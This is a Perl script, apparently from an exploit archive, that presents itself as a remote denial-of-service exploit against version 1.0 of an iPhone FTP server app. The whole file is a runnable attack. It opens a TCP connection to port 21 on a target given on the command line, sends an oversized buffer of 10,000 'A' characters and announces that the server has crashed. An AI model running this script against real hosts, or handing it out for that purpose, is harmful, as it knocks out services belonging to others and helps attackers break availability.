#!/usr/bin/perl

#

# Exploit: FTP Server By Zhang Boyang - Remote Dos Exploit

# Date: 24/02/10

# Author: Ale46

# Software Link: http://itunes.apple.com/us/app/ftp-server/id356055128?mt=8

# Version: 1.0

# Tested on: Iphone 3GS with 3.1.2 firmware

# Greetz: Gandalf



use IO::Socket;



if (@ARGV<1){

	print ("[-]\tUsage: ./ftpServer <server_ip>\n");

	exit();

}

my $host = $ARGV[0];

my $port = 21;

my $stuff = "A"*10000;

my $socket = IO::Socket::INET->new ( Proto => "tcp", PeerAddr => $host,

PeerPort => $port);

unless ($socket) { die "Can\'t connect to $host" }

print "[-]\tConnected to FTP Server\n\n";

sleep(2);

print "[-]\tSending evil buffer..\n\n";

sleep(2);

print $socket $stuff;

sleep(2);

print "[-]\tPUAAA..Crashed..\n";